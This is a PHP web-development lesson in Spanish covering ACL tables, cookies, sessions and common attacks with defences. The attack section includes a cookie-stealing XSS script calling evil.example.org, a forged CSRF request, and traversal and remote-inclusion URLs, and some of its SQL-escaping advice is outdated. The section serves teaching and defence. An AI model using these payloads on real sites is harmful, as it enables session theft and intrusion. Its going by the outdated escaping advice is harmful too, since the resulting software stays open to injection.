---
layout: page
title: 3 Cookies, sesiones y seguridad
permalink: /cookies-sesiones-seguridad/
nav_order: 3
has_children: false
parent: Desarrollo Web en Entorno Servidor
---
# 3. Cookies, sesiones y seguridad

## 3.1. Autenticación mediante ACL

Casi todas las aplicaciones web incluyen un subsistema de autenticación de usuarios (ACL = Access Control List).

Ese subsistema suele estar basado en este diseño de base de datos:

![Tablas ACL](/assets/images/03-acl.jpg)

Esto significa que necesitamos **cinco tablas** para implementar un ACL completo.

Sin embargo, la mayor parte de las veces tendremos suficiente con solo tres tablas (usuarios, roles y usuarios-roles), o incluso solo con una (usuarios, añadiendo quizá un campo "tipo"). Optar por una solución más o menos compleja dependerá del tipos de sistema que estemos implementando.

En cualquier caso, es conveniente que conozcas el esquema ACL completo (5 tablas) para que lo pongas en práctica cuando lo necesites.

## 3.2. Cookies

### 3.2.1. ¿Qué son las cookies?

Las cookies son pequeños archivos de texto enviados desde el servidor que se almacenan en el lado del cliente. Permiten guardar información de forma persistente, de manera que se mantenga entre una petición al servidor y otra. Una cookie puede durar minutos, horas, días o incluso indefinidamente.

PHP soporta cookies de forma transparente. Se pueden configurar Cookies usando las funciones setcookie() o setrawcookie() y el array global $_COOKIE. 

### 3.2.2. Menajando cookies con PHP

#### Enviar una cookie: setcookie()

Esta función define una cookie que se enviará al cliente junto con el resto de las cabeceras de HTTP. Devuelve *true* si la cookie se envía con éxito o *false* en caso contrario. 

Su sintaxis es:

```php
bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain [, bool $secure = false [, bool $httponly = false ]]]]]] )
```

Las cookies deben enviarse antes de que el script genere ninguna salida. Esto es una restricción del protocolo http. Por lo tanto, debes llamar a esta función antes de hacer *cualquier* salida, incluidos espacios en blanco. En caso contrario, la cookie no estará disponible hasta que la página se recargue.

La función setcookie() admite un montón de parámetros, la mayor parte de ellos optativos:

* **name**: El nombre de la cookie. Este es el único obligatorio. 
* **value**: El valor de la cookie.
* **expire**: El tiempo que la cookie tardará en expirar. Se trata de una fecha expresada en formato Unix.
* **path**: La ruta del servidor para la que la cookie estará disponible. Si se utiliza '/', la cookie estará disponible en la totalidad del dominio.
* **domain**: El dominio para el cual la cookie está disponible.
* **secure**: Si la cookie solo debería enviarse en caso de conexión https, pon este argument a *true*.
* **httponly**: Esta cookie solo será accesible a través de http. Es decir, no podrá utilizarse desde Javascript.

Aquí tienes tres ejemplos de envío de la misma cookie:

```php
<?php 
$value = 'I'm your father'; 

setcookie("VaderQuote", $value); 
setcookie("VaderQuote", $value, time()+3600);  // la cookie expira en una hora 
setcookie("VaderQuote", $value, time()+3600, "/quotes/", "bestquotes.com", 1); 
?>
```

#### Recuperar una cookie: $_COOKIES[]

Para ver el contenido de una cookie, simplemente hay que acceder al array global $_COOKIES. Por ejemplo: 

```php
<?php 
// Imprimir una cookie individual 
echo $_COOKIE["VaderQuote"]; 

?> 
```

#### Borrar una cookie 

Para forzar el borrado de una cookie en el cliente basta con enviarla con una fecha de expiración anterior a la fecha actual. Por ejemplo:

```php
<?php 
setcookie ("VaderQuote", "", time() - 3600);  // Establece la fecha de expiración una hora en el pasado
?>
``` 

## 3.3. Sesiones

Las sesiones en PHP habilitan un mecanismo para que un script almacene variables (llamadas **variables de sesión**) en el servidor de manera persistente, de modo que posteriores peticiones de scripts procedentes de un cliente puedan acceder a esas variables.

Cada cliente tiene su propio espacio de variables de sesión en el servidor, de manera que no se mezclan unas con otras, ni un cliente puede acceder a las variables de otro cliente.

La forma en la que PHP logra distinguir a los clientes entre sí es enviándoles una cookie con un valor aleatorio diferente para cada cliente.

En el archivo php.ini se puede configurar la manera en la que PHP almacenará las variables de sesión (en memoria, en un fichero, etc), pero esto es irrelevante de cara a su funcionamiento y compete más al administrador del sistema que al programador. Lo que a nosotros nos interesa es aprender a crear variables de sesión, asignarles valor y recuperarlo posteriormente.

### 3.3.1. Abrir sesiones: session_start()

Antes de acceder a cualquier variable de sesión (ya sea para crearla, para modificarla o para eliminarla) necesitamos indicarle a PHP que queremos usar variables de sesión en ese scrpit.

La función **session_start()** se usa para eso: habilita el acceso a las variables de sesión, es decir, crea una nueva sesión o reanuda una sesión preexistente.

Las sesiones admiten un nombre, por si necesitas crear sesiones separadas para el mismo cliente. No obstante, la mayor parte de las veces te bastará con crear sesiones sin nombre, sin necesidad de pasar ningún argumento a session_start().

### 3.3.2. Usar variables de sesión: $_SESSION

Las variables de sesión se manipulan a través del array superglobal **$_SESSION**.

Si necesitas una variable de sesión llamada, por ejemplo, nombre_usuario, simplemente haz esto:

```php
session_start();
$_SESSION['nombre_usuario'] = "lo-que-sea";
```

Por supuesto, el valor de esa posición del array $_SESSION puede consultarse o modificarse cuando lo necesitemos.

### 3.3.3. Eliminar variables de sesión: unset() y session_destroy()

La función **unset()** se utiliza para destruir cualquier variable, incluidas las de sesión:

```php
unset($_SESSION['nombre_usuario']);
```

Si lo que deseas es destruir todas las variables de sesión, es preferible recurrir a **session_destroy()**.

Ahora bien, session_destroy() destruye la información asociada a la sesión actual, pero no elimina realmente las variables de la memoria del servidor ni borra la cookie de sesión del cliente.

Para asegurarte de destruir todas las variables de sesión, puedes usar la función **session_unset()**. 

Y, para borrar la cookie de sesión, debes usar **setcookie()**, como en este ejemplo:

```php

<?php
// Retomar la sesión.
session_start();

// Destruir todas las variables de sesión (optativo)
session_unset();

// Si se desea destruir la sesión completamente, borre también la cookie de sesión.
// Nota: ¡Esto destruirá la sesión, y no la información de la sesión!
$params = session_get_cookie_params();
setcookie(session_name(), '', time() - 42000,
        $params["path"], $params["domain"],
        $params["secure"], $params["httponly"]
);

// Finalmente, cerrar la sesión
session_destroy();
?>
```

## 3.4. Sesiones, cookies y seguridad

Cookies y variables de sesión se usan a menudo para controlar la seguridad de la aplicación web.

Por ejemplo, tras el login, el ID del usuario puede almacenarse en:

* **Una cookie**. Si existe esa cookie, significa que el login ha sido correcto y la aplicación puede continuar.
* **Una variable de sesión**. Si existe determinada variable (por ejemplo, una con el id del usuario), el login ha sido correcto.

Cuando el usuario abandona la aplicación, el programa debe destruir la cookie o cerrar la sesión.

Pues bien: **ninguno de estos métodos es completamente seguro**.

Las cookies pueden rastrearse o modificarse en el ordenador del cliente. Además, algunos clientes las tienen desactivadas. ¡No te puedes fiar de ellas!

Las variables de sesión, en principio más seguras, pueden ser atacadas capturando el ID de sesión, como veremos más adelante.

El método más seguro, y el más complicado de programar, es el que combina:

* Cookies y/o variables de sesión.
* Variables guardadas en una tabla de la BD.

El uso de frameworks solventes (como los que veremos este curso) hace innecesario tomarse este trabajo, puesto que todos habilitan un mecanismo de sesiones seguras que mejora notablemente las prestaciones de las sesiones nativas de PHP.

## 3.5. Técnicas de ataque frecuentes

(Esta sección está adaptada de [securitybydefault.com](securitybydefault.com))

Uno de los fallos más graves y más frecuentes a la hora de escribir aplicaciones PHP es olvidarse de la seguridad.

Cualquier aplicación web, por el mero hecho de estar abierta a recibir información procedente de la red, es susceptible de ser atacada. Y te aseguro que, antes o después, cualquier aplicación que está online acaba por ser atacada. Es una certeza matemática.

En esta sección vamos a describir qué tipos de ataque son los más frecuentes.

Aunque proporcionaremos algunas estrategias de defensa (que debes tener en cuenta en tus desarrollos), hay una estrategia común a todos estos ataques: utilizar un framework potente como Laravel, Symfony o Zend, debidamente actualizado. Los mecanismos de seguridad que implementan estos frameworks son suficientes para la mayor parte de los casos y se mejoran cada vez que se descubre una vulnerabilidad.

### 3.5.1. Captura de ID de sesión

El ID de sesión se guarda como una cookie en el cliente. Por lo tanto, viaja en el paquete http desde el servidor hasta el cliente.

Un atacante que esté escuchando en esa red puede leer el ID de sesión del paquete http y, de ese modo, suplantar la identidad de la persona que inició la sesión. También puede inyectar Javascript a su víctima para capturar de ese modo el ID de sesión, con idénticos resultados.

Soluciones:

* Combinar las variables de sesión con cookies o con entradas en la base de datos.
* Cambiar el ID de sesión periódicamente.
* No confiar en variables de sesión de PHP para almacenar información muy sensible.
* Denegar el acceso a la cookie de sesión desde Javascript (usando el atributo httponly).
* Acceder solo a webs que usen https, no http. De ese modo, la cookie de sesión viaja encriptada hasta el navegador.

### 3.5.2. Inyección de SQL

XXX

Este ataque se produce cuando un atacante ejecuta sentencias SQL en la base de datos del sitio web, insertando en un campo del formulario sentencias SQL dentro de otra sentencia SQL haciendo que se ejecute la sentencia invasora.

Se recomienda:

    • Filtrar los datos. Por ejemplo, si tenemos en nuestro formulario el campo username, y sabemos que los usuarios sólo pueden estar compuestos por letras y números, no se deben permitir caracteres como " ' " o " = " . O si se trata del campo e-mail, podemos utilizar expresiones regulares para validarlo, como preg_match('/^.+@.+\..{2,3}$/',$_POST['email'])
    • Usar funciones que escapan caracteres especiales de una cadena para su uso en una sentencia SQL, como mysql_real_escape_string(), la cual coloca barras invertidas antes de los siguientes caracteres: \x00, \n, \r, \, ', " y \x1a. O addslashes(). La directiva de PHP magic_quotes_gpc está activada por defecto, y básicamente ejecuta la función addslashes() en todos los datos GET, POST, y COOKIE. No se debe utilizar addslashes() en las cadenas que ya se han escapado con magic_quotes_gpc ya que se hará un doble escape.

### 3.5.3. XSS (cross site scripting)

Las vulnerabilidades de XSS permiten ejecutar código de scripting en el contexto del sitio web:

    • Explotando la confianza que tiene un usuario de un sitio web. Puede que los usuarios no tengan un alto nivel de confianza en un sitio web, pero sí el navegador. Por ejemplo, cuando el navegador envía cookies en una petición.
    • Haciendo que los sitios web muestren datos externos. Como aplicaciones de mayor riesgo que incluyen foros, clientes de correo web, o contenido de RSS.
    • Cuando los datos externos no se filtran adecuadamente un atacante puede inyectar un contenido. Esto es tan peligroso como dejar que el atacante edite código en el servidor.

Un usuario que ejecute este código con JavaScript activado en su navegador será redireccionado a evil.example.org, y las cookies asociadas al sitio web serán incluidas en la consulta:

<script>document.locationn = 'http://evil.example.org/steal_cookies.php?cookies=' + document.cookie</script>

Se recomienda:

    • Filtrar todos los datos externos. El filtrado de datos es la práctica más importante que se puede adoptar. Al validar todos los datos externos a medida que entran y salen de la aplicación se mitigarán la mayoría de las preocupaciones del XSS.
    • Utilizar las funciones que tiene PHP que ayudan al filtrado. Pueden ser útiles htmlentities () que convierte caracteres a entidades HTML, strip_tags () que elimina las etiquetas HTML y PHP de una cadena y utf8_decode ().
    • Basarse en listas blancas. Supongamos que los datos no son válidos hasta que no se pruebe que lo son. Esto implica verificar la longitud y asegurar que sólo los caracteres válidos son permitidos. Por ejemplo, si se inserta el nombre y apellidos, se debe asegurar que sólo se permiten letras y espacios. Por ejemplo Berners-Lee se consideraría nula, pero esto se puede arreglar añadiendo este nombre a la lista blanca. Es mejor rechazar datos válidos que aceptar datos maliciosos.
    • Utilizar una convención de nomenclatura estricta. Una convención de nomenclatura puede ayudar a los desarrolladores a distinguir entre datos filtrados y sin filtrar.

### 3.5.4. CSRF (cross site request forgery)

Explota la confianza que tiene un sitio web en la identidad de un usuario.

Un ejemplo sería enviar los siguientes datos en la petición:

GET /buy.php?symbol=SCOX&quantity=1000 HTTP/1.1
Host: stocks.example.org
User-Agent: Mozilla/5.0 Gecko
Accept: text/xml, image/png, image/jpeg, image/gif, */*
Cookie: PHPSESSID=1234

Se recomienda:

    • Utilizar POST en lugar de GET en los formularios. Sobre todo cuando se esté realizando una acción que involucra una compra.
    • Utilizar $_POST en lugar de confiar en register_globals. Utilizar el método POST es inútil si se confía en register_globals y se referencian variables como $symbol o $quantity. Lo mismo sucede si se utiliza $_REQUEST.
    • Generar un token único para cada petición y verificarlo posteriormente.

### 3.5.5. DT (directory transversal)

Este ataque se produce cuando se especifican rutas de ficheros como "../../../../file" en los datos del formulario y mediante un script se llama a estos ficheros, proporcionando a un atacante la posibilidad de realizar cambios en el sistema de ficheros.

Si dentro del script de PHP se incluye algo como require $page . '.php'; sabiendo que esta página se almacena en /home/someone/public_html/index.php, un atacante podría hacer index.php?page=../secret accediendo a /home/someone/secret.php

Se recomienda:

    • Tener un array de páginas válidas.
    • Comprobar que el archivo solicitado coincide con un formato concreto.

### 3.5.6. RFI (remote file inclusion)

Como su nombre indica, se produce cuando se incluye un archivo remoto.

Por ejemplo, si existe un archivo en la ruta http://example.com/malice.php y nuestro script se encuentra en http://site.com/index.php. Un atacante puede hacer esta petición: http://site.com/index.php?page=http://example.com/malice lo que provocará que el archivo se ejecute y escriba un nuevo fichero en disco, pudiendo ser este fichero una shell que permita la ejecución de comandos.

O, por ejemplo, se podría asignar a page el valor http://example.com/malice.php? seguido de una consulta a base de datos.

Se recomienda:

    • No confiar en los datos que no provengan de nuestro sistema.
    • Se deben validar los datos que introduce el usuario.


